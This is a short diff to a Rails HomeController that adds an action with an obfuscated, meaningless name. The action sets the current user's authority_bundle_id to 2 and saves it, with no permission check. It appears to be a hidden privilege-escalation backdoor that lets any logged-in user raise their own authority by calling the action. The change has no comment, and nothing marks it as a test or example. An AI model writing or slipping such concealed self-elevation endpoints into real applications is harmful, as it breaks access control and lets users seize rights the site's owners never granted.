@@ -101,5 +101,13 @@ class HomeController < ApplicationController
     def main_org
        @bongsa = Bongsa.all
     end
+    
+    def ajtwoddltkwkcjfjaahenghkdlxld
+        
+        sas = User.find(current_user.id)
+        sas.authority_bundle_id = 2
+        sas.save
+        redirect_to '/'
+    end
   
 end
